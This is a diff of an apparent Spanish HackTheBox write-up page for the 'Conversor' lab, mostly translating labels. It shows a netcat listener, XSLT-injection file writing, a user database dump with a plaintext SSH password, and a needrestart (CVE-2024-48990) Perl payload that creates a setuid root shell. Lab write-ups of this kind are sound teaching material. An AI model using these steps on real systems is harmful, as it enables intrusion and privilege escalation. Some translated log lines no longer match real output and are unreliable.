@@ -141,7 +141,7 @@
     .val-purple { color: var(--purple); }
     .val-facil  { color: #00ffcc; }
 
-    /* ATTACK PATH */
+    /* RUTA DE ATAQUE */
     .attack-path { display: flex; flex-direction: column; gap: 0; }
     .ap-item { display: flex; align-items: flex-start; gap: 0.8rem; padding: 0.5rem 0; }
     .ap-dot { width: 8px; height: 8px; background: var(--green); border-radius: 50%; margin-top: 4px; flex-shrink: 0; box-shadow: 0 0 6px var(--green); }
@@ -324,15 +324,16 @@
   </style>
 </head>
 <body>
-<a href="#main" class="skip-link">Skip to content</a>
+<a href="#main" class="skip-link">Saltar al contenido</a>
 <div class="cursor" id="cursor"></div>
 <div class="cursor-ring" id="cursorRing"></div>
 <div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
 
 <nav>
-  <a href="../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
-  <a href="https://brandeiks.github.io/writeups/" class="nav-back">volver al portafolio</a>
-</nav>
+    <a href="../../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+    <a href="../../../writeups/index.html" class="nav-back">ANÁLISIS</a>
+    <a href="../../../diccionario/index.html" class="nav-back">DICCIONARIO</a>
+  </nav>
 
 <!-- HERO -->
 <section class="writeup-hero">
@@ -340,22 +341,22 @@
   <div class="hero-glow"></div>
   <div class="writeup-hero-content">
     <div class="breadcrumb">
-      <a href="https://brandeiks.github.io/">brandeiks</a> /
-      <a href="https://brandeiks.github.io/writeups/">writeups</a> /
-      <a href="https://brandeiks.github.io/writeups/">hackthebox</a> /
+      <a href="../../../index.html">brandeiks</a> /
+      <a href="../../../writeups/index.html">análisis</a> /
+      <a href="../../../writeups/index.html">hackthebox</a> /
       <span>conversor</span>
     </div>
     <h1 class="writeup-title">CONVER<span>SOR</span></h1>
-    <p class="writeup-subtitle">// HackTheBox · Linux · Fácil · XSLT Injection + Cron Abuse + CVE-2024-48990</p>
+    <p class="writeup-subtitle">// HackTheBox · Linux · Fácil · Inyección XSLT + abuso de cron + CVE-2024-48990</p>
     <div class="writeup-meta">
+      <span class="meta-badge badge-facil">● FÁCIL</span>
       <span class="meta-badge badge-htb">HACKTHEBOX</span>
       <span class="meta-badge badge-linux">LINUX</span>
-      <span class="meta-badge badge-facil">FÁCIL</span>
       <span class="meta-badge badge-xslt">XSLT INJECTION</span>
       <span class="meta-badge badge-cron">CRON ABUSE</span>
       <span class="meta-badge badge-ssh">SSH</span>
       <span class="meta-badge badge-cve">CVE-2024-48990</span>
-      <span class="meta-date">// 2026-05-31</span>
+      <span class="meta-date">📅 Mayo 2026 · Por Brandeiks</span>
     </div>
   </div>
 </section>
@@ -370,8 +371,8 @@
         <li><a href="#hosts">02 · /etc/hosts</a></li>
         <li><a href="#web">03 · Aplicación Web</a></li>
         <li><a href="#sourcecode">04 · Source Code</a></li>
-        <li><a href="#xslt">05 · XSLT Injection</a></li>
-        <li><a href="#shell">06 · Reverse Shell</a></li>
+        <li><a href="#xslt">05 · Inyección XSLT</a></li>
+        <li><a href="#shell">06 · Reverse shell</a></li>
         <li><a href="#db">07 · SQLite · Hashes</a></li>
         <li><a href="#ssh">08 · SSH como fismathack</a></li>
         <li><a href="#privesc">09 · PrivEsc · needrestart</a></li>
@@ -392,7 +393,7 @@
     </div>
 
     <div class="sidebar-box">
-      <p class="sidebar-title">// ATTACK PATH</p>
+      <p class="sidebar-title">// RUTA DE ATAQUE</p>
       <div class="attack-path">
         <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">nmap → <span>22, 80</span></div></div>
         <div class="ap-line"></div>
@@ -400,7 +401,7 @@
         <div class="ap-line"></div>
         <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">Download <span>source_code.tar.gz</span></div></div>
         <div class="ap-line"></div>
-        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>XSLT Injection</span> → write .py</div></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Inyección XSLT</span> → write .py</div></div>
         <div class="ap-line"></div>
         <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">Cron → exec .py → <span>reverse shell</span></div></div>
         <div class="ap-line"></div>
@@ -443,7 +444,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="ping 10.129.238.31 -c 3">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">PING</span>
         <div><span class="prompt">$ </span><span class="cmd">ping <span class="arg">10.129.238.31</span> <span class="flag">-c</span> <span class="arg">3</span></span></div>
       </div>
@@ -512,7 +513,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open 10.129.238.31 -oX conversor.xml">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">ESCANEO</span>
         <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-p-</span> <span class="flag">-sSCV</span> <span class="flag">-n</span> <span class="flag">-Pn</span> <span class="flag">--min-rate=5000</span> <span class="flag">--open</span> <span class="arg">10.129.238.31</span> <span class="flag">-oX</span> <span class="arg">conversor.xml</span></span></div>
       </div>
@@ -564,7 +565,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="xsltproc /usr/share/nmap/nmap.xsl conversor.xml > conversor.html">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">XSLT</span>
         <div><span class="prompt">$ </span><span class="cmd">xsltproc <span class="arg">/usr/share/nmap/nmap.xsl</span> <span class="arg">conversor.xml</span> &gt; <span class="arg">conversor.html</span></span></div>
       </div>
@@ -601,7 +602,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo nano /etc/hosts">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">HOSTS</span>
         <div><span class="prompt">$ </span><span class="cmd">sudo nano <span class="arg">/etc/hosts</span></span></div>
       </div>
@@ -660,7 +661,7 @@
       </div>
 
       <div class="cmd-block" data-cmd='curl http://conversor.htb/about | grep -i "download|source|href"'>
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">CURL</span>
         <div><span class="prompt">$ </span><span class="cmd">curl <span class="arg">http://conversor.htb/about</span> <span class="flag">|</span> grep <span class="flag">-i</span> <span class="arg">"download|source|href"</span></span></div>
       </div>
@@ -706,7 +707,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="curl -o source_code.tar.gz http://conversor.htb/static/source_code.tar.gz">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">DESCARGA</span>
         <div><span class="prompt">$ </span><span class="cmd">curl <span class="flag">-o</span> <span class="arg">source_code.tar.gz</span> <span class="arg">http://conversor.htb/static/source_code.tar.gz</span></span></div>
       </div>
@@ -726,7 +727,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="file source_code.tar.gz && tar -xvf source_code.tar.gz">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">TAR</span>
         <div><span class="prompt">$ </span><span class="cmd">file <span class="arg">source_code.tar.gz</span></span></div>
         <div><span class="prompt">$ </span><span class="cmd">tar <span class="flag">-xvf</span> <span class="arg">source_code.tar.gz</span></span></div>
@@ -831,7 +832,7 @@
     <!-- ===================== 05 XSLT INJECTION ===================== -->
     <div class="section" id="xslt">
       <p class="section-label">// 05</p>
-      <h2 class="section-title">XSLT Injection · Escritura de Archivo</h2>
+      <h2 class="section-title">Inyección XSLT · Escritura de Archivo</h2>
       <div class="section-line"></div>
 
       <div class="step-marker">
@@ -840,7 +841,7 @@
       </div>
       <div class="prose">
         <p>
-          Antes de ir directamente a la reverse shell, verificamos que la XSLT Injection funciona
+          Antes de ir directamente a la reverse shell, verificamos que la Inyección XSLT funciona
           usando <span class="hl">exsl:document</span>. Esta función de la extensión EXSLT permite
           crear y escribir archivos en el sistema de archivos del servidor durante la transformación XSLT.
         </p>
@@ -893,7 +894,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="curl http://conversor.htb/static/probe.txt">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">VERIFY</span>
         <div><span class="prompt">$ </span><span class="cmd">curl <span class="arg">http://conversor.htb/static/probe.txt</span></span></div>
       </div>
@@ -919,7 +920,7 @@
     <!-- ===================== 06 REVERSE SHELL ===================== -->
     <div class="section" id="shell">
       <p class="section-label">// 06</p>
-      <h2 class="section-title">Reverse Shell · www-data</h2>
+      <h2 class="section-title">Reverse shell · www-data</h2>
       <div class="section-line"></div>
 
       <div class="step-marker">
@@ -995,7 +996,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="nc -lvnp 4444">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">LISTENER</span>
         <div><span class="prompt">$ </span><span class="cmd">nc <span class="flag">-lvnp</span> <span class="arg">4444</span></span></div>
       </div>
@@ -1011,7 +1012,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="python3 -c 'import pty;pty.spawn(\"/bin/bash\")' && export TERM=xterm">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">TTY</span>
         <div><span class="prompt">$ </span><span class="cmd">python3 <span class="flag">-c</span> <span class="arg">'import pty;pty.spawn("/bin/bash")'</span></span></div>
         <div><span class="prompt">www-data@conversor:~$ </span><span class="cmd">export <span class="arg">TERM=xterm</span></span></div>
@@ -1057,7 +1058,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="cd /var/www/conversor.htb/instance && sqlite3 users.db 'select * from users;'">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SQLITE</span>
         <div><span class="prompt">www-data@conversor:~$ </span><span class="cmd">cd <span class="arg">/var/www/conversor.htb/instance</span></span></div>
         <div><span class="prompt">www-data@conversor:/var/www/conversor.htb/instance$ </span><span class="cmd">sqlite3 <span class="arg">users.db</span> <span class="arg">"select * from users;"</span></span></div>
@@ -1119,12 +1120,12 @@
     <!-- ===================== 08 SSH ===================== -->
     <div class="section" id="ssh">
       <p class="section-label">// 08</p>
-      <h2 class="section-title">SSH como fismathack · User Flag</h2>
+      <h2 class="section-title">SSH como fismathack · Bandera de usuario</h2>
       <div class="section-line"></div>
 
       <div class="step-marker">
         <div class="step-num">16</div>
-        <span class="step-title">CONECTAR POR SSH Y OBTENER USER FLAG</span>
+        <span class="step-title">CONECTAR POR SSH Y OBTENER BANDERA DE USUARIO</span>
       </div>
       <div class="prose">
         <p>
@@ -1136,12 +1137,12 @@
         </p>
         <p>
           Tras autenticarnos encontramos el archivo <span class="hl-cyan">user.txt</span> en el
-          home de fismathack con la <strong>User Flag</strong> de la máquina.
+          home de fismathack con la <strong>Bandera de usuario</strong> de la máquina.
         </p>
       </div>
 
       <div class="cmd-block" data-cmd="ssh fismathack@10.129.238.31">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SSH</span>
         <div><span class="prompt">$ </span><span class="cmd">ssh <span class="arg">fismathack@10.129.238.31</span></span></div>
       </div>
@@ -1149,7 +1150,7 @@
       <div class="output-block">
         <div>fismathack@10.129.238.31's password: <span class="o-yellow">Keepmesafeandwarm</span></div>
         <div>&nbsp;</div>
-        <div>Last login: Sun May 31 21:25:44 2026 from 10.10.16.7</div>
+        <div>Last login: Sun Mayo 31 21:25:44 2026 from 10.10.16.7</div>
         <div>fismathack@conversor:~$ ls</div>
         <div><span class="o-cyan">user.txt</span></div>
         <div>fismathack@conversor:~$ cat user.txt</div>
@@ -1162,7 +1163,7 @@
     <!-- ===================== 09 PRIVESC ===================== -->
     <div class="section" id="privesc">
       <p class="section-label">// 09</p>
-      <h2 class="section-title">Escalada de Privilegios · needrestart</h2>
+      <h2 class="section-title">Escalada de privilegios · needrestart</h2>
       <div class="section-line"></div>
 
       <div class="step-marker">
@@ -1179,7 +1180,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo -l">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SUDO</span>
         <div><span class="prompt">fismathack@conversor:~$ </span><span class="cmd">sudo <span class="flag">-l</span></span></div>
       </div>
@@ -1231,12 +1232,12 @@
       </div>
 
       <div class="cmd-block" data-cmd="cat > /dev/shm/pwn.pl << 'EOF'&#10;use strict; use warnings;&#10;system('/usr/bin/install','-m','04755','/bin/bash','/usr/local/bin/bsh');&#10;1;&#10;EOF">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">PERL PAYLOAD</span>
         <div><span class="prompt">fismathack@conversor:~$ </span><span class="cmd">cat &gt; <span class="arg">/dev/shm/pwn.pl</span> &lt;&lt; <span class="arg">'EOF'</span></span></div>
         <div><span class="cmd">use strict; use warnings;</span></div>
-        <div><span class="cmd">system(<span class="arg">'/usr/bin/install'</span>,<span class="arg">'-m'</span>,<span class="arg">'04755'</span>,<span class="arg">'/bin/bash'</span>,<span class="arg">'/usr/local/bin/bsh'</span>);</div>
-        <div>1;</span></div>
+        <div><span class="cmd">system(<span class="arg">'/usr/bin/install'</span>,<span class="arg">'-m'</span>,<span class="arg">'04755'</span>,<span class="arg">'/bin/bash'</span>,<span class="arg">'/usr/local/bin/bsh'</span>);</span></div>
+        <div><span class="cmd">1;</span></div>
         <div><span class="cmd">EOF</span></div>
       </div>
     </div>
@@ -1246,7 +1247,7 @@
     <!-- ===================== 10 ROOT ===================== -->
     <div class="section" id="root">
       <p class="section-label">// 10</p>
-      <h2 class="section-title">Root Flag</h2>
+      <h2 class="section-title">Bandera de root</h2>
       <div class="section-line"></div>
 
       <div class="step-marker">
@@ -1265,7 +1266,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo needrestart -c /dev/shm/pwn.pl -r l">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">EXPLOIT</span>
         <div><span class="prompt">fismathack@conversor:~$ </span><span class="cmd">sudo needrestart <span class="flag">-c</span> <span class="arg">/dev/shm/pwn.pl</span> <span class="flag">-r</span> <span class="arg">l</span></span></div>
       </div>
@@ -1300,14 +1301,14 @@
       </div>
 
       <div class="cmd-block" data-cmd="ls -la /usr/local/bin/bsh && /usr/local/bin/bsh -p">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">ROOT</span>
         <div><span class="prompt">fismathack@conversor:~$ </span><span class="cmd">ls <span class="flag">-la</span> <span class="arg">/usr/local/bin/bsh</span></span></div>
         <div><span class="prompt">fismathack@conversor:~$ </span><span class="cmd"><span class="arg">/usr/local/bin/bsh</span> <span class="flag">-p</span></span></div>
       </div>
 
       <div class="output-block">
-        <div><span class="o-red">-rwsr-xr-x</span> 1 root root 1396520 May 31 21:31 /usr/local/bin/bsh</div>
+        <div><span class="o-red">-rwsr-xr-x</span> 1 root root 1396520 Mayo 31 21:31 /usr/local/bin/bsh</div>
         <div>&nbsp;</div>
         <div><span class="o-red">bsh-5.1# </span>cd /root</div>
         <div><span class="o-red">bsh-5.1# </span>ls</div>
@@ -1318,11 +1319,11 @@
 
       <div class="cred-box">
         <div class="cred-item">
-          <div class="cred-label">USER FLAG</div>
+          <div class="cred-label">BANDERA DE USUARIO</div>
           <div class="cred-val">9741709e16657a97c14cf281bbc33781</div>
         </div>
         <div class="cred-item">
-          <div class="cred-label">ROOT FLAG</div>
+          <div class="cred-label">BANDERA DE ROOT</div>
           <div class="cred-val">3e6b2b25df792686ef4b2e3d73fe7e58</div>
         </div>
       </div>
@@ -1418,7 +1419,7 @@
       <div class="glosario-grid">
 
         <div class="glos-card">
-          <div class="glos-term">XSLT Injection — Inyección de Hojas de Estilo</div>
+          <div class="glos-term">Inyección XSLT — Inyección de Hojas de Estilo</div>
           <div class="glos-def">
             <strong>XSLT (eXtensible Stylesheet Language Transformations)</strong> es un lenguaje
             declarativo para transformar documentos XML en otros formatos (HTML, PDF, texto).
@@ -1440,7 +1441,7 @@
             bajo qué usuario. Si una tarea cron ejecuta scripts de un directorio donde un usuario
             sin privilegios tiene permisos de escritura, ese usuario puede colocar código malicioso
             que se ejecutará automáticamente con los privilegios del usuario de la tarea. En Conversor,
-            la combinación de escritura arbitraria de archivos (via XSLT Injection) en el directorio
+            la combinación de escritura arbitraria de archivos (via Inyección XSLT) en el directorio
             <code>scripts/</code> más el cron que ejecuta todo .py en ese directorio como www-data
             crean una cadena de explotación completa sin necesidad de ninguna interacción adicional.
           </div>
@@ -1461,7 +1462,7 @@
         </div>
 
         <div class="glos-card">
-          <div class="glos-term">XXE vs XSLT Injection — Diferencias</div>
+          <div class="glos-term">XXE vs Inyección XSLT — Diferencias</div>
           <div class="glos-def">
             <strong>XXE (XML External Entity)</strong> es una vulnerabilidad en el parser XML que
             permite incluir entidades externas (archivos del servidor, URLs de red) al procesar XML.
@@ -1538,9 +1539,9 @@
 
 <!-- FOOTER -->
 <footer>
-  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · HackTheBox</p>
-  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
-</footer>
+    <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Análisis de conversor · HackTheBox</p>
+    <p>Hecho con <span>kali linux</span> &amp; <span>❤</span></p>
+  </footer>
 
 <script>
   // ACTIVE TOC
